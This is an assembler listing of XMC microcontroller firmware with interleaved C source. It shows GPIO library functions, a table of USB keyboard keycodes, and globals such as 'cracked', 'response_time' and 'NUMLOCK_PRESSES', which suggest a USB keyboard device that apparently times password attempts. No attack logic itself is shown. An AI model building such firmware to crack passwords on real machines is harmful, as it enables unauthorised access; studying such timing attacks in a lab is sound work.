+ 205:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** void XMC_GPIO_SetMode(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_MODE_t mode);
+ 206:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 207:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 208:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 209:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 210:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	 Constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 211:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	 Port pin number.
+ 212:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  level output level selection. Refer @ref XMC_GPIO_OUTPUT_LEVEL_t for valid values.
+ 213:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 214:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 215:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 216:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 217:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Set port pin output level to high or low.It configures hardware registers Pn_OMR.\a level is ini
+ 218:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * configured during initialization in XMC_GPIO_Init(). Call this API to alter output level as need
+ 219:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 220:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 221:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  XMC_GPIO_SetOutputHigh(), XMC_GPIO_SetOutputLow().
+ 222:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 223:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 224:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().
+ 225:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 226:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 227:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 228:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 229:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputLevel(XMC_GPIO_PORT_t *const port, const uint8_t pin, const 
+ 230:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 231:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLevel: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 232:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLevel: Invalid output level", XMC_GPIO_CHECK_OUTPUT_LEVEL(level));
+ 233:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   
+ 234:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = (uint32_t)level << pin;
+ 235:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+ 236:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 237:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 238:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 239:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 240:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	Port pin number.
+ 241:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 242:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 243:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 244:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 245:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  Sets port pin output to high. It configures hardware registers Pn_OMR.
+ 246:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 247:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  \par<b>Related APIs:</b><BR>
+ 248:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  XMC_GPIO_SetOutputLow()
+ 249:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 250:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 251:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().\n
+ 252:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value 
+ 253:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 254:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 255:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 256:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputHigh(XMC_GPIO_PORT_t *const port, const uint8_t pin)
+ 257:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+  27              		.loc 1 257 1
+  28              		.cfi_startproc
+  29              		@ args = 0, pretend = 0, frame = 8
+  30              		@ frame_needed = 1, uses_anonymous_args = 0
+  31              		@ link register save eliminated.
+  32 0000 80B4     		push	{r7}
+  33              	.LCFI0:
+  34              		.cfi_def_cfa_offset 4
+  35              		.cfi_offset 7, -4
+  36 0002 83B0     		sub	sp, sp, #12
+  37              	.LCFI1:
+  38              		.cfi_def_cfa_offset 16
+  39 0004 00AF     		add	r7, sp, #0
+  40              	.LCFI2:
+  41              		.cfi_def_cfa_register 7
+  42 0006 7860     		str	r0, [r7, #4]
+  43 0008 0B46     		mov	r3, r1
+  44 000a FB70     		strb	r3, [r7, #3]
+ 258:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputHigh: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 259:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 260:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = (uint32_t)0x1U << pin;
+  45              		.loc 1 260 30
+  46 000c FB78     		ldrb	r3, [r7, #3]	@ zero_extendqisi2
+  47 000e 0122     		movs	r2, #1
+  48 0010 9A40     		lsls	r2, r2, r3
+  49              		.loc 1 260 13
+  50 0012 7B68     		ldr	r3, [r7, #4]
+  51 0014 5A60     		str	r2, [r3, #4]
+ 261:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+  52              		.loc 1 261 1
+  53 0016 00BF     		nop
+  54 0018 0C37     		adds	r7, r7, #12
+  55              	.LCFI3:
+  56              		.cfi_def_cfa_offset 4
+  57 001a BD46     		mov	sp, r7
+  58              	.LCFI4:
+  59              		.cfi_def_cfa_register 13
+  60              		@ sp needed
+  61 001c 5DF8047B 		ldr	r7, [sp], #4
+  62              	.LCFI5:
+  63              		.cfi_restore 7
+  64              		.cfi_def_cfa_offset 0
+  65 0020 7047     		bx	lr
+  66              		.cfi_endproc
+  67              	.LFE130:
+  69              		.section	.text.XMC_GPIO_SetOutputLow,"ax",%progbits
+  70              		.align	1
+  71              		.syntax unified
+  72              		.thumb
+  73              		.thumb_func
+  74              		.fpu fpv4-sp-d16
+  76              	XMC_GPIO_SetOutputLow:
+  77              	.LFB131:
+ 262:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 263:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 264:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 265:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 266:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	port pin number.
+ 267:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 268:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return  None
+ 269:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 270:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *\par<b>Description:</b><br>
+ 271:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Sets port pin output to low. It configures hardware registers Pn_OMR.\n
+ 272:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 273:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>>
+ 274:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * XMC_GPIO_SetOutputHigh()
+ 275:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 276:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *\par<b>Note:</b><br>
+ 277:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().
+ 278:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value 
+ 279:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 280:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 281:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 282:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputLow(XMC_GPIO_PORT_t *const port, const uint8_t pin)
+ 283:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+  78              		.loc 1 283 1
+  79              		.cfi_startproc
+  80              		@ args = 0, pretend = 0, frame = 8
+  81              		@ frame_needed = 1, uses_anonymous_args = 0
+  82              		@ link register save eliminated.
+  83 0000 80B4     		push	{r7}
+  84              	.LCFI6:
+  85              		.cfi_def_cfa_offset 4
+  86              		.cfi_offset 7, -4
+  87 0002 83B0     		sub	sp, sp, #12
+  88              	.LCFI7:
+  89              		.cfi_def_cfa_offset 16
+  90 0004 00AF     		add	r7, sp, #0
+  91              	.LCFI8:
+  92              		.cfi_def_cfa_register 7
+  93 0006 7860     		str	r0, [r7, #4]
+  94 0008 0B46     		mov	r3, r1
+  95 000a FB70     		strb	r3, [r7, #3]
+ 284:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLow: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 285:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 286:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = 0x10000U << pin;
+  96              		.loc 1 286 24
+  97 000c FB78     		ldrb	r3, [r7, #3]	@ zero_extendqisi2
+  98 000e 4FF48032 		mov	r2, #65536
+  99 0012 9A40     		lsls	r2, r2, r3
+ 100              		.loc 1 286 13
+ 101 0014 7B68     		ldr	r3, [r7, #4]
+ 102 0016 5A60     		str	r2, [r3, #4]
+ 287:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+ 103              		.loc 1 287 1
+ 104 0018 00BF     		nop
+ 105 001a 0C37     		adds	r7, r7, #12
+ 106              	.LCFI9:
+ 107              		.cfi_def_cfa_offset 4
+ 108 001c BD46     		mov	sp, r7
+ 109              	.LCFI10:
+ 110              		.cfi_def_cfa_register 13
+ 111              		@ sp needed
+ 112 001e 5DF8047B 		ldr	r7, [sp], #4
+ 113              	.LCFI11:
+ 114              		.cfi_restore 7
+ 115              		.cfi_def_cfa_offset 0
+ 116 0022 7047     		bx	lr
+ 117              		.cfi_endproc
+ 118              	.LFE131:
+ 120              		.global	feedback_received
+ 121              		.bss
+ 124              	feedback_received:
+ 125 0000 00       		.space	1
+ 126              		.global	cracked
+ 129              	cracked:
+ 130 0001 00       		.space	1
+ 131              		.global	sent
+ 134              	sent:
+ 135 0002 00       		.space	1
+ 136              		.global	initial_feedback
+ 139              	initial_feedback:
+ 140 0003 00       		.space	1
+ 141              		.global	max_found
+ 144              	max_found:
+ 145 0004 00       		.space	1
+ 146              		.global	mReset
+ 149              	mReset:
+ 150 0005 00       		.space	1
+ 151              		.global	p
+ 154              	p:
+ 155 0006 00       		.space	1
+ 156              		.global	NUMLOCK_PRESSES
+ 159              	NUMLOCK_PRESSES:
+ 160 0007 00       		.space	1
+ 161              		.global	ready_to_Enter
+ 164              	ready_to_Enter:
+ 165 0008 00       		.space	1
+ 166              		.global	maxI
+ 169              	maxI:
+ 170 0009 00       		.space	1
+ 171              		.global	maxJ
+ 174              	maxJ:
+ 175 000a 00       		.space	1
+ 176              		.global	sending_time
+ 177 000b 00       		.align	2
+ 180              	sending_time:
+ 181 000c 00000000 		.space	4
+ 182              		.global	response_time
+ 183              		.align	2
+ 186              	response_time:
+ 187 0010 00000000 		.space	4
+ 188              		.global	keys
+ 189              		.data
+ 190              		.align	2
+ 193              	keys:
+ 194 0000 04       		.byte	4
+ 195 0001 000200   		.ascii	"\000\002\000"
+ 196 0004 02       		.byte	2
+ 197 0005 000000   		.space	3
+ 198 0008 00000000 		.word	0
+ 199 000c 00000000 		.word	0
+ 200 0010 00000000 		.space	4
+ 201 0014 05       		.byte	5
+ 202 0015 000200   		.ascii	"\000\002\000"
+ 203 0018 02       		.byte	2
+ 204 0019 000000   		.space	3
+ 205 001c 00000000 		.word	0
+ 206 0020 00000000 		.word	0
+ 207 0024 00000000 		.space	4
+ 208 0028 06       		.byte	6
+ 209 0029 000200   		.ascii	"\000\002\000"
+ 210 002c 02       		.byte	2
+ 211 002d 000000   		.space	3
+ 212 0030 00000000 		.word	0
+ 213 0034 00000000 		.word	0
+ 214 0038 00000000 		.space	4
+ 215 003c 07       		.byte	7
+ 216 003d 000200   		.ascii	"\000\002\000"
+ 217 0040 02       		.byte	2
+ 218 0041 000000   		.space	3
+ 219 0044 00000000 		.word	0
+ 220 0048 00000000 		.word	0
+ 221 004c 00000000 		.space	4
+ 222 0050 08       		.byte	8
+ 223 0051 000200   		.ascii	"\000\002\000"
+ 224 0054 02       		.byte	2
+ 225 0055 000000   		.space	3
+ 226 0058 00000000 		.word	0
+ 227 005c 00000000 		.word	0
+ 228 0060 00000000 		.space	4
+ 229 0064 09       		.byte	9
+ 230 0065 000200   		.ascii	"\000\002\000"
+ 231 0068 02       		.byte	2
+ 232 0069 000000   		.space	3
+ 233 006c 00000000 		.word	0
+ 234 0070 00000000 		.word	0
+ 235 0074 00000000 		.space	4
+ 236 0078 0A       		.byte	10
+ 237 0079 000200   		.ascii	"\000\002\000"
+ 238 007c 02       		.byte	2
+ 239 007d 000000   		.space	3
+ 240 0080 00000000 		.word	0
+ 241 0084 00000000 		.word	0
+ 242 0088 00000000 		.space	4
+ 243 008c 0B       		.byte	11
+ 244 008d 000200   		.ascii	"\000\002\000"
+ 245 0090 02       		.byte	2
+ 246 0091 000000   		.space	3
+ 247 0094 00000000 		.word	0
+ 248 0098 00000000 		.word	0
+ 249 009c 00000000 		.space	4
+ 250 00a0 0C       		.byte	12
+ 251 00a1 000200   		.ascii	"\000\002\000"
+ 252 00a4 02       		.byte	2
+ 253 00a5 000000   		.space	3
+ 254 00a8 00000000 		.word	0
+ 255 00ac 00000000 		.word	0
+ 256 00b0 00000000 		.space	4
+ 257 00b4 0D       		.byte	13
+ 258 00b5 000200   		.ascii	"\000\002\000"
+ 259 00b8 02       		.byte	2
+ 260 00b9 000000   		.space	3
+ 261 00bc 00000000 		.word	0
+ 262 00c0 00000000 		.word	0
+ 263 00c4 00000000 		.space	4
+ 264 00c8 0E       		.byte	14
+ 265 00c9 000200   		.ascii	"\000\002\000"
+ 266 00cc 02       		.byte	2
+ 267 00cd 000000   		.space	3
+ 268 00d0 00000000 		.word	0
+ 269 00d4 00000000 		.word	0
+ 270 00d8 00000000 		.space	4
+ 271 00dc 0F       		.byte	15
+ 272 00dd 000200   		.ascii	"\000\002\000"
+ 273 00e0 02       		.byte	2
+ 274 00e1 000000   		.space	3
+ 275 00e4 00000000 		.word	0
+ 276 00e8 00000000 		.word	0
+ 277 00ec 00000000 		.space	4
+ 278 00f0 10       		.byte	16
+ 279 00f1 000200   		.ascii	"\000\002\000"
+ 280 00f4 02       		.byte	2
+ 281 00f5 000000   		.space	3
+ 282 00f8 00000000 		.word	0
+ 283 00fc 00000000 		.word	0
+ 284 0100 00000000 		.space	4
+ 285 0104 11       		.byte	17
+ 286 0105 000200   		.ascii	"\000\002\000"
+ 287 0108 02       		.byte	2
+ 288 0109 000000   		.space	3
+ 289 010c 00000000 		.word	0
+ 290 0110 00000000 		.word	0
+ 291 0114 00000000 		.space	4
+ 292 0118 12       		.byte	18
+ 293 0119 000200   		.ascii	"\000\002\000"
+ 294 011c 02       		.byte	2
+ 295 011d 000000   		.space	3
+ 296 0120 00000000 		.word	0
+ 297 0124 00000000 		.word	0
+ 298 0128 00000000 		.space	4
+ 299 012c 13       		.byte	19
+ 300 012d 000200   		.ascii	"\000\002\000"
+ 301 0130 02       		.byte	2
+ 302 0131 000000   		.space	3
+ 303 0134 00000000 		.word	0
+ 304 0138 00000000 		.word	0
+ 305 013c 00000000 		.space	4
+ 306 0140 14       		.byte	20
+ 307 0141 000200   		.ascii	"\000\002\000"
+ 308 0144 02       		.byte	2
+ 309 0145 000000   		.space	3
+ 310 0148 00000000 		.word	0
+ 311 014c 00000000 		.word	0
+ 312 0150 00000000 		.space	4
+ 313 0154 15       		.byte	21
+ 314 0155 000200   		.ascii	"\000\002\000"
+ 315 0158 02       		.byte	2
+ 316 0159 000000   		.space	3
+ 317 015c 00000000 		.word	0
+ 318 0160 00000000 		.word	0
+ 319 0164 00000000 		.space	4
+ 320 0168 16       		.byte	22
+ 321 0169 000200   		.ascii	"\000\002\000"
+ 322 016c 02       		.byte	2
+ 323 016d 000000   		.space	3
+ 324 0170 00000000 		.word	0
+ 325 0174 00000000 		.word	0
+ 326 0178 00000000 		.space	4
+ 327 017c 17       		.byte	23
+ 328 017d 000200   		.ascii	"\000\002\000"
+ 329 0180 02       		.byte	2
+ 330 0181 000000   		.space	3
+ 331 0184 00000000 		.word	0
+ 332 0188 00000000 		.word	0
+ 333 018c 00000000 		.space	4
+ 334 0190 18       		.byte	24
+ 335 0191 000200   		.ascii	"\000\002\000"
+ 336 0194 02       		.byte	2
+ 337 0195 000000   		.space	3
+ 338 0198 00000000 		.word	0
+ 339 019c 00000000 		.word	0
+ 340 01a0 00000000 		.space	4
+ 341 01a4 19       		.byte	25
+ 342 01a5 000200   		.ascii	"\000\002\000"
+ 343 01a8 02       		.byte	2
+ 344 01a9 000000   		.space	3
+ 345 01ac 00000000 		.word	0
+ 346 01b0 00000000 		.word	0
+ 347 01b4 00000000 		.space	4
+ 348 01b8 1A       		.byte	26
+ 349 01b9 000200   		.ascii	"\000\002\000"
+ 350 01bc 02       		.byte	2
+ 351 01bd 000000   		.space	3
+ 352 01c0 00000000 		.word	0
+ 353 01c4 00000000 		.word	0
+ 354 01c8 00000000 		.space	4
+ 355 01cc 1B       		.byte	27
+ 356 01cd 000200   		.ascii	"\000\002\000"
+ 357 01d0 02       		.byte	2
+ 358 01d1 000000   		.space	3
+ 359 01d4 00000000 		.word	0
+ 360 01d8 00000000 		.word	0
+ 361 01dc 00000000 		.space	4
+ 362 01e0 1D       		.byte	29
+ 363 01e1 000200   		.ascii	"\000\002\000"
+ 364 01e4 02       		.byte	2
+ 365 01e5 000000   		.space	3
+ 366 01e8 00000000 		.word	0
+ 367 01ec 00000000 		.word	0
+ 368 01f0 00000000 		.space	4
+ 369 01f4 1C       		.byte	28
+ 370 01f5 000200   		.ascii	"\000\002\000"
+ 371 01f8 02       		.byte	2
+ 372 01f9 000000   		.space	3
+ 373 01fc 00000000 		.word	0
+ 374 0200 00000000 		.word	0
+ 375 0204 00000000 		.space	4
+ 376 0208 1E       		.byte	30
+ 377 0209 000200   		.ascii	"\000\002\000"
+ 378 020c 02       		.byte	2
+ 379 020d 000000   		.space	3
+ 380 0210 00000000 		.word	0
+ 381 0214 00000000 		.word	0
+ 382 0218 00000000 		.space	4
+ 383 021c 1F       		.byte	31
+ 384 021d 000200   		.ascii	"\000\002\000"
+ 385 0220 02       		.byte	2
+ 386 0221 000000   		.space	3
+ 387 0224 00000000 		.word	0
+ 388 0228 00000000 		.word	0
+ 389 022c 00000000 		.space	4
+ 390 0230 20       		.byte	32
+ 391 0231 000200   		.ascii	"\000\002\000"
+ 392 0234 02       		.byte	2
+ 393 0235 000000   		.space	3
+ 394 0238 00000000 		.word	0
+ 395 023c 00000000 		.word	0
+ 396 0240 00000000 		.space	4
+ 397 0244 21       		.byte	33
+ 398 0245 000200   		.ascii	"\000\002\000"
+ 399 0248 02       		.byte	2
+ 400 0249 000000   		.space	3
+ 401 024c 00000000 		.word	0
+ 402 0250 00000000 		.word	0
+ 403 0254 00000000 		.space	4
+ 404 0258 22       		.byte	34
+ 405 0259 000200   		.ascii	"\000\002\000"
+ 406 025c 02       		.byte	2
+ 407 025d 000000   		.space	3
+ 408 0260 00000000 		.word	0
+ 409 0264 00000000 		.word	0
+ 410 0268 00000000 		.space	4
+ 411 026c 23       		.byte	35
+ 412 026d 000200   		.ascii	"\000\002\000"
+ 413 0270 02       		.byte	2
+ 414 0271 000000   		.space	3
+ 415 0274 00000000 		.word	0
+ 416 0278 00000000 		.word	0
+ 417 027c 00000000 		.space	4
+ 418 0280 24       		.byte	36
+ 419 0281 000240   		.ascii	"\000\002@"
+ 420 0284 03       		.byte	3
+ 421 0285 000000   		.space	3
+ 422 0288 00000000 		.word	0
+ 423 028c 00000000 		.word	0
+ 424 0290 00000000 		.word	0
+ 425 0294 25       		.byte	37
+ 426 0295 000240   		.ascii	"\000\002@"
+ 427 0298 03       		.byte	3
+ 428 0299 000000   		.space	3
+ 429 029c 00000000 		.word	0
+ 430 02a0 00000000 		.word	0
+ 431 02a4 00000000 		.word	0
+ 432 02a8 26       		.byte	38
+ 433 02a9 000240   		.ascii	"\000\002@"
+ 434 02ac 03       		.byte	3
+ 435 02ad 000000   		.space	3
+ 436 02b0 00000000 		.word	0
+ 437 02b4 00000000 		.word	0
+ 438 02b8 00000000 		.word	0
+ 439 02bc 27       		.byte	39
+ 440 02bd 000240   		.ascii	"\000\002@"
+ 441 02c0 03       		.byte	3
+ 442 02c1 000000   		.space	3
+ 443 02c4 00000000 		.word	0
+ 444 02c8 00000000 		.word	0
+ 445 02cc 00000000 		.word	0
+ 446 02d0 2D       		.byte	45
+ 447 02d1 000240   		.ascii	"\000\002@"
+ 448 02d4 03       		.byte	3
+ 449 02d5 000000   		.space	3
+ 450 02d8 00000000 		.word	0
+ 451 02dc 00000000 		.word	0
+ 452 02e0 00000000 		.word	0
+ 453 02e4 35       		.byte	53
+ 454 02e5 000200   		.ascii	"\000\002\000"
+ 455 02e8 02       		.byte	2
+ 456 02e9 000000   		.space	3
+ 457 02ec 00000000 		.word	0
+ 458 02f0 00000000 		.word	0
+ 459 02f4 00000000 		.word	0
+ 460 02f8 30       		.byte	48
+ 461 02f9 000240   		.ascii	"\000\002@"
+ 462 02fc 03       		.byte	3
+ 463 02fd 000000   		.space	3
+ 464 0300 00000000 		.word	0
+ 465 0304 00000000 		.word	0
+ 466 0308 00000000 		.word	0
+ 467 030c 38       		.byte	56
+ 468 030d 000200   		.ascii	"\000\002\000"
+ 469 0310 02       		.byte	2
+ 470 0311 000000   		.space	3
+ 471 0314 00000000 		.word	0
+ 472 0318 00000000 		.word	0
+ 473 031c 00000000 		.space	4
+ 474 0320 36       		.byte	54
+ 475 0321 000200   		.ascii	"\000\002\000"
+ 476 0324 02       		.byte	2
+ 477 0325 000000   		.space	3
+ 478 0328 00000000 		.word	0
+ 479 032c 00000000 		.word	0
+ 480 0330 00000000 		.word	0
+ 481 0334 37       		.byte	55
+ 482 0335 000200   		.ascii	"\000\002\000"
+ 483 0338 02       		.byte	2
+ 484 0339 000000   		.space	3
+ 485 033c 00000000 		.word	0
+ 486 0340 00000000 		.word	0
+ 487 0344 00000000 		.space	4
+ 488 0348 32       		.byte	50
+ 489 0349 000200   		.ascii	"\000\002\000"
+ 490 034c 02       		.byte	2
+ 491 034d 000000   		.space	3
+ 492 0350 00000000 		.word	0
+ 493 0354 00000000 		.word	0
+ 494 0358 00000000 		.space	4
+ 495 035c 64       		.byte	100
+ 496 035d 000240   		.ascii	"\000\002@"
+ 497 0360 03       		.byte	3
+ 498 0361 000000   		.space	3
+ 499 0364 00000000 		.word	0
+ 500 0368 00000000 		.word	0
+ 501 036c 00000000 		.word	0
+ 502              		.global	millisec
+ 503              		.bss
+ 504              		.align	2
+ 507              	millisec:
+ 508 0014 00000000 		.space	4
+ 509              		.comm	log_low,400,4
+ 510              		.comm	log_high,400,4
+ 511              		.global	clock_config
+ 512              		.section	.rodata
+ 513              		.align	2
+ 516              	clock_config:
+ 517 0000 50       		.byte	80
+ 518 0001 02       		.byte	2
+ 519 0002 04       		.byte	4
+ 520 0003 01       		.byte	1
+ 521 0004 0000     		.short	0
+ 522 0006 01       		.byte	1
+ 523 0007 00       		.space	1
+ 524 0008 00       		.byte	0
+ 525 0009 000000   		.space	3
+ 526 000c 00000100 		.word	65536
+ 527 0010 01       		.byte	1
+ 528 0011 01       		.byte	1
+ 529 0012 01       		.byte	1
+ 530 0013 01       		.byte	1
+ 531              		.section	.text.getMaxResponse,"ax",%progbits
+ 532              		.align	1
+ 533              		.global	getMaxResponse
+ 534              		.syntax unified
+ 535              		.thumb
+ 536              		.thumb_func
+ 537              		.fpu fpv4-sp-d16
+ 539              	getMaxResponse:
+ 540              	.LFB203:
+ 541              		.file 2 "main.c"
+   1:main.c        **** 
+   2:main.c        **** #include "KeyboardHID.h"
+   3:main.c        **** #include "german_keyboardCodes.h"
+   4:main.c        **** 
+   5:main.c        **** /* Macros: */
+   6:main.c        **** #define LED1 P1_1
+   7:main.c        **** #define LED2 P1_0
+   8:main.c        **** 
+   9:main.c        **** bool feedback_received=0, cracked=0, sent=0, initial_feedback=0, max_found=0;
+  10:main.c        **** uint8_t mReset=0, p=0;
+  11:main.c        **** uint8_t NUMLOCK_PRESSES=0, ready_to_Enter=0, maxI=0, maxJ=0;
